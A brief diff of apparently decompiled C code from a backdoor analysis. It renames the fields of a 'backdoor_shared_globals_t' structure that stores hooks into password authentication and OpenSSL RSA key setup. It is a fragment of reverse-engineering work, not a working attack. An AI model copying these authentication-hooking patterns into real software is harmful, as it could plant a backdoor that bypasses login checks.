@@ -19,9 +19,9 @@ int init_shared_globals(backdoor_shared_globals_t *shared_globals)
   
   status = 5;
   if (shared_globals != (backdoor_shared_globals_t *)0x0) {
-    shared_globals->mm_answer_authpassword_hook = mm_answer_authpassword_hook;
-    shared_globals->hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
-    shared_globals->globals = (global_context_t **)&global_ctx;
+    shared_globals->authpassword_hook_entry = mm_answer_authpassword_hook;
+    shared_globals->evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
+    shared_globals->global_ctx_slot = (global_context_t **)&global_ctx;
     status = 0;
   }
   return status;
